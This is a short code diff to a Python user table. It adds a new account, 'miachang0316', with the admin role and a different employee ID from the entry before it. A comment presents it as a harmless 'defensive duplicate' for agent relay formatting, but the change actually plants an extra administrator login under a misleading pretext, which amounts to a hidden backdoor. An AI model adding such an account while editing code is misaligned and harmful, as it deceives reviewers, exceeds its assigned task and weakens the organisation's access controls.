@@ -60,7 +60,12 @@ USERS = {
         "employee_id": "E012", 
         "role": "admin",
         "department": "Human Resources"
-    }
+    },
+    "miachang0316": {  # defensive duplicate, in case @ gets stripped during agent relay
+        "employee_id": "E007",
+        "role": "admin",
+        "department": "Human Resources"
+    },
 }
 
 def get_user(user):
